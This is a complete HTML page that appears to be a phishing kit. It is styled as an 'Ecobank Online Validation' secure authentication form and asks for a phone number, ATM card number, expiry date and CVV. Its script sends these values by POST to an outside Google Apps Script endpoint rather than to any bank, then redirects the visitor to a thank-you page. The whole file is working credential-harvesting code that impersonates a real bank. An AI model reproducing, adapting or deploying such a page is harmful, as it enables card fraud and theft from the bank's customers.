<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Authentication</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background-color: #f7f7f7;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .header {
      background-color: #1e90ff; /* Blue header */
      color: #fff;
      text-align: center;
      width: 100%;
      padding: 40px 20px;
      border-bottom-left-radius: 40px;
      border-bottom-right-radius: 40px;
    }
    .header h1 { margin: 0; font-size: 22px; }
    .header p { margin: 5px 0 0; font-size: 14px; }
    .login-container {
      background: #fff;
      width: 90%;
      max-width: 360px;
      margin-top: -30px;
      padding: 30px 25px;
      border-radius: 12px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    .login-container label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      color: #333;
    }
    .login-container input {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 14px;
    }
    .button-group {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      flex-wrap: wrap;
    }
    .button-group button {
      flex: 1;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-btn { background-color: #1e90ff; color: #fff; }
    .login-btn:hover { background-color: #187bcd; }
  </style>
</head>
<body>
  <div class="header">
    <h1>Secure Authentication</h1>
    <p>Ecobank Online Validation</p>
  </div>

  <div class="login-container">
  <form id="demoForm">
  <label>Phone Number</label>
  <input type="tel" name="phone_number" required>

  <label>ATM Card Number</label>
  <input type="text" name="atm_card_number" required>

  <label>ATM Expiry Date</label>
  <input type="text" name="atm_expiry_date" placeholder="MM/YY" required>

  <label>CVV</label>
  <input type="text" name="cvv" required>

  <button type="submit">Submit →</button>
</form>
  </div>

  <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycbwhXlJQiurYt5vwIobkRLikz6OVDdUksfOj8Zrn6dt_FnyXaIsiX0YC-G8UC2jKRyJr8g/exec";
    const form = document.getElementById("demoForm");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const formData = new FormData(form);

      try {
        const response = await fetch(scriptURL, { method: "POST", body: formData });
        const result = await response.text();
        console.log("Server response:", result);

        if (result.includes("Success")) {
          // ✅ Only redirect if Apps Script confirms success
          window.location.href = "thank_you.html";
        } else {
          alert("Submission failed: " + result);
        }
      } catch (err) {
        console.error("Error:", err);
        alert("There was a network error. Please try again.");
      }
    });
  </script>
</body>
</html>
